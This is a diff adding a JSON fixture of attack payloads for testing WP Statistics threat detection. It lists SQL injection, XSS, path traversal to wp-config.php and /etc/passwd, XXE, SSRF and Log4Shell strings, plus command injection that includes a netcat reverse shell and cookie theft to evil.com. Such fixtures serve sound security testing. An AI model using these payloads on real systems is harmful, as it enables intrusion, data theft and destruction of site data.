@@ -1,0 +1,393 @@
+{
+  "description": "Security attack payloads for testing WP Statistics threat detection and input validation",
+  "version": "1.0.0",
+  "disclaimer": "These payloads are for authorized security testing only. Use responsibly.",
+
+  "sql_injection": {
+    "description": "OWASP A03:2021 - Injection attacks targeting database queries",
+    "classic_union": [
+      "' UNION SELECT NULL--",
+      "' UNION SELECT NULL,NULL--",
+      "' UNION SELECT NULL,NULL,NULL--",
+      "' UNION ALL SELECT 1,2,3--",
+      "' UNION SELECT username,password FROM users--",
+      "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
+      "admin' UNION SELECT 1,1,1 FROM wp_users WHERE 1=1--"
+    ],
+    "blind_boolean": [
+      "' AND 1=1--",
+      "' AND 1=2--",
+      "' AND 'a'='a",
+      "' AND 'a'='b",
+      "1' AND (SELECT COUNT(*) FROM wp_users)>0--",
+      "' OR 1=1--",
+      "' OR 'x'='x",
+      "admin' AND '1'='1"
+    ],
+    "time_based": [
+      "' AND SLEEP(5)--",
+      "' AND BENCHMARK(10000000,SHA1('test'))--",
+      "'; WAITFOR DELAY '0:0:5'--",
+      "1' AND (SELECT SLEEP(5))--",
+      "' OR SLEEP(5)#"
+    ],
+    "stacked_queries": [
+      "'; DROP TABLE wp_statistics_visits--",
+      "'; INSERT INTO wp_users VALUES(999,'hacker','pass')--",
+      "'; UPDATE wp_options SET option_value='hacked' WHERE option_name='blogname'--",
+      "'; DELETE FROM wp_posts--",
+      "1; TRUNCATE TABLE wp_statistics_visitors--"
+    ],
+    "comment_bypass": [
+      "admin'--",
+      "admin'/*",
+      "admin'#",
+      "'--",
+      "1'/**/AND/**/1=1--",
+      "'/**/OR/**/1=1/**/--"
+    ],
+    "case_variations": [
+      "' uNiOn SeLeCt NULL--",
+      "' UnIoN aLl SeLeCt 1,2,3--",
+      "' oR 1=1--",
+      "' AnD 1=1--"
+    ],
+    "encoding_bypass": [
+      "%27%20OR%201%3D1--",
+      "%27%20UNION%20SELECT%20NULL--",
+      "\\x27 OR 1=1--",
+      "char(39)+OR+1=1--"
+    ]
+  },
+
+  "xss": {
+    "description": "OWASP A03:2021 - Cross-Site Scripting attacks",
+    "script_tags": [
+      "<script>alert(1)</script>",
+      "<script>alert('XSS')</script>",
+      "<script>alert(document.cookie)</script>",
+      "<script>alert(document.domain)</script>",
+      "<script src=//evil.com/xss.js></script>",
+      "<script>new Image().src='http://evil.com/?c='+document.cookie</script>",
+      "<SCRIPT>alert(1)</SCRIPT>",
+      "<scRiPt>alert(1)</scRiPt>"
+    ],
+    "event_handlers": [
+      "<img src=x onerror=alert(1)>",
+      "<img src=x onerror='alert(1)'>",
+      "<body onload=alert(1)>",
+      "<svg onload=alert(1)>",
+      "<input onfocus=alert(1) autofocus>",
+      "<marquee onstart=alert(1)>",
+      "<video><source onerror=alert(1)>",
+      "<details open ontoggle=alert(1)>",
+      "<div onmouseover=alert(1)>hover me</div>",
+      "<iframe onload=alert(1)>"
+    ],
+    "javascript_uris": [
+      "javascript:alert(1)",
+      "javascript:alert(document.cookie)",
+      "javascript:void(alert(1))",
+      "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
+    ],
+    "data_uris": [
+      "data:text/html,<script>alert(1)</script>",
+      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+      "data:application/javascript,alert(1)"
+    ],
+    "svg_based": [
+      "<svg><script>alert(1)</script></svg>",
+      "<svg onload=alert(1)>",
+      "<svg/onload=alert(1)>",
+      "<svg><animate onbegin=alert(1)>",
+      "<svg><set onbegin=alert(1)>"
+    ],
+    "attribute_injection": [
+      "\" onclick=\"alert(1)\" x=\"",
+      "' onclick='alert(1)' x='",
+      "\" onfocus=\"alert(1)\" autofocus x=\"",
+      "'-alert(1)-'",
+      "\"><script>alert(1)</script>"
+    ],
+    "template_injection": [
+      "{{constructor.constructor('alert(1)')()}}",
+      "${alert(1)}",
+      "#{alert(1)}",
+      "{{7*7}}",
+      "<%= system('id') %>"
+    ]
+  },
+
+  "encoding_bypass": {
+    "description": "Attacks using various encoding techniques to bypass filters",
+    "double_url_encoding": [
+      "%253Cscript%253Ealert(1)%253C/script%253E",
+      "%2527%2520OR%25201%253D1--",
+      "%252e%252e%252f%252e%252e%252f",
+      "%25253Cscript%25253E"
+    ],
+    "unicode_encoding": [
+      "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+      "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
+      "\\u0027 OR 1=1--",
+      "\\u003Cimg src=x onerror=alert(1)\\u003E"
+    ],
+    "html_entities": [
+      "&#60;script&#62;alert(1)&#60;/script&#62;",
+      "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
+      "&lt;script&gt;alert(1)&lt;/script&gt;",
+      "&#39; OR 1=1--"
+    ],
+    "null_byte_injection": [
+      "test%00.php",
+      "admin%00@evil.com",
+      "../../etc/passwd%00.jpg",
+      "script%00.js",
+      "test\u0000<script>alert(1)</script>"
+    ],
+    "overlong_utf8": [
+      "\\xC0\\xAF",
+      "\\xE0\\x80\\xAF",
+      "\\xF0\\x80\\x80\\xAF"
+    ],
+    "mixed_encoding": [
+      "%3c%53CRIPT%3e",
+      "<scr%69pt>",
+      "<script/src='data:,alert(1)'>"
+    ]
+  },
+
+  "header_injection": {
+    "description": "HTTP header injection and response splitting attacks",
+    "crlf_injection": [
+      "value\\r\\nX-Injected: header",
+      "value%0d%0aX-Injected: header",
+      "value\\r\\nSet-Cookie: session=hijacked",
+      "value%0d%0a%0d%0a<script>alert(1)</script>",
+      "value\\nX-XSS-Protection: 0"
+    ],
+    "host_header": [
+      "evil.com",
+      "localhost",
+      "127.0.0.1",
+      "internal.server.local"
+    ],
+    "user_agent_attacks": [
+      "<script>alert(1)</script>",
+      "' OR 1=1--",
+      "() { :; }; /bin/bash -c 'cat /etc/passwd'",
+      "${jndi:ldap://evil.com/a}",
+      "{{7*7}}"
+    ],
+    "x_forwarded_for_spoofing": [
+      "127.0.0.1",
+      "192.168.1.1",
+      "10.0.0.1",
+      "8.8.8.8, 127.0.0.1",
+      "::1"
+    ],
+    "referer_injection": [
+      "javascript:alert(1)",
+      "data:text/html,<script>alert(1)</script>",
+      "http://evil.com/?redirect=http://target.com",
+      "//evil.com",
+      "\\\\evil.com"
+    ]
+  },
+
+  "path_traversal": {
+    "description": "OWASP A01:2021 - Broken Access Control via path traversal",
+    "basic_traversal": [
+      "../../../etc/passwd",
+      "..\\..\\..\\windows\\system32\\config\\sam",
+      "....//....//....//etc/passwd",
+      "..%2f..%2f..%2fetc%2fpasswd",
+      "..%252f..%252f..%252fetc%252fpasswd"
+    ],
+    "wordpress_specific": [
+      "../../../wp-config.php",
+      "../../wp-includes/version.php",
+      "../wp-admin/includes/upgrade.php",
+      "../../../../wp-config.php%00",
+      "../../../wp-content/debug.log"
+    ],
+    "encoding_variations": [
+      "%2e%2e%2f",
+      "%2e%2e/",
+      "..%2f",
+      "%2e%2e%5c",
+      "..%5c",
+      "..%c0%af",
+      "..%c1%9c"
+    ],
+    "filter_bypass": [
+      "....//",
+      "....\\\\",
+      "..../",
+      "....\\/",
+      ".../.../.../",
+      "..;/"
+    ]
+  },
+
+  "command_injection": {
+    "description": "OWASP A03:2021 - OS Command Injection",
+    "basic_commands": [
+      "; ls -la",
+      "| cat /etc/passwd",
+      "& whoami",
+      "`id`",
+      "$(whoami)",
+      "; ping -c 10 127.0.0.1",
+      "| nc -e /bin/sh evil.com 4444"
+    ],
+    "windows_commands": [
+      "& dir",
+      "| type C:\\Windows\\System32\\config\\SAM",
+      "; net user",
+      "& ipconfig /all"
+    ],
+    "filter_bypass": [
+      ";{cat,/etc/passwd}",
+      "$(cat${IFS}/etc/passwd)",
+      "cat$IFS/etc/passwd",
+      "w`h`o`a`m`i",
+      "/???/??t /???/p??s??"
+    ]
+  },
+
+  "xxe": {
+    "description": "OWASP A05:2021 - XML External Entity attacks",
+    "basic_xxe": [
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/xxe\">]><foo>&xxe;</foo>"
+    ],
+    "parameter_entity": [
+      "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\">%xxe;]>"
+    ],
+    "blind_xxe": [
+      "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/?data=%file;\">%xxe;]>"
+    ]
+  },
+
+  "ssrf": {
+    "description": "OWASP A10:2021 - Server-Side Request Forgery",
+    "internal_services": [
+      "http://localhost/admin",
+      "http://127.0.0.1:22",
+      "http://[::1]/",
+      "http://0.0.0.0/",
+      "http://169.254.169.254/latest/meta-data/",
+      "http://metadata.google.internal/"
+    ],
+    "protocol_smuggling": [
+      "file:///etc/passwd",
+      "dict://localhost:11211/info",
+      "gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall",
+      "ldap://localhost/",
+      "tftp://evil.com/file"
+    ],
+    "dns_rebinding": [
+      "http://7f000001.c0a80001.rbndr.us/",
+      "http://localtest.me/"
+    ],
+    "filter_bypass": [
+      "http://127.1/",
+      "http://0x7f000001/",
+      "http://2130706433/",
+      "http://017700000001/",
+      "http://[0:0:0:0:0:ffff:127.0.0.1]/"
+    ]
+  },
+
+  "ldap_injection": {
+    "description": "LDAP Injection attacks",
+    "basic_injection": [
+      "*",
+      "*)(&",
+      "*)(uid=*))(|(uid=*",
+      "admin)(&))",
+      "x)(|(cn=*"
+    ]
+  },
+
+  "nosql_injection": {
+    "description": "NoSQL database injection attacks",
+    "mongodb": [
+      "{\"$gt\": \"\"}",
+      "{\"$ne\": null}",
+      "{\"$regex\": \".*\"}",
+      "{\"$where\": \"sleep(5000)\"}",
+      "true, $where: '1 == 1'"
+    ]
+  },
+
+  "log_injection": {
+    "description": "Log forging and injection attacks",
+    "log_forging": [
+      "normal_log_entry\\n[CRITICAL] Fake critical error",
+      "user\\nAdmin logged in from 127.0.0.1",
+      "test\\r\\n\\r\\nNew fake log entry",
+      "$(whoami)",
+      "${jndi:ldap://evil.com/a}"
+    ]
+  },
+
+  "deserialization": {
+    "description": "OWASP A08:2021 - Insecure Deserialization",
+    "php_object_injection": [
+      "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"data\";}",
+      "a:1:{s:4:\"test\";s:6:\"hacked\";}",
+      "O:+8:\"stdClass\":0:{}",
+      "C:8:\"stdClass\":0:{}"
+    ]
+  },
+
+  "prototype_pollution": {
+    "description": "JavaScript prototype pollution attacks",
+    "payloads": [
+      "__proto__[admin]=true",
+      "constructor[prototype][admin]=true",
+      "__proto__.admin=true",
+      "{\"__proto__\": {\"admin\": true}}"
+    ]
+  },
+
+  "target_fields": {
+    "description": "Which request fields to inject payloads into",
+    "base64_fields": ["resourceUri", "referred", "page_uri"],
+    "plain_fields": ["timezone", "language", "languageFullName"],
+    "numeric_fields": ["resourceUriId", "resource_id", "screenWidth", "screenHeight"],
+    "header_fields": ["User-Agent", "Referer", "X-Forwarded-For"]
+  },
+
+  "severity_levels": {
+    "critical": ["sql_injection", "command_injection", "xxe", "deserialization"],
+    "high": ["xss", "path_traversal", "ssrf"],
+    "medium": ["header_injection", "ldap_injection", "nosql_injection"],
+    "low": ["log_injection", "prototype_pollution"]
+  },
+
+  "test_scenarios": {
+    "basic_security_scan": {
+      "description": "Quick security validation",
+      "categories": ["sql_injection.classic_union", "xss.script_tags", "path_traversal.basic_traversal"],
+      "count_per_category": 3
+    },
+    "comprehensive_scan": {
+      "description": "Full OWASP coverage",
+      "categories": ["all"],
+      "count_per_category": 5
+    },
+    "injection_focused": {
+      "description": "Focus on injection vulnerabilities",
+      "categories": ["sql_injection", "xss", "command_injection", "xxe"],
+      "count_per_category": 10
+    },
+    "encoding_bypass_test": {
+      "description": "Test filter bypass techniques",
+      "categories": ["encoding_bypass", "sql_injection.encoding_bypass"],
+      "count_per_category": 5
+    }
+  }
+}
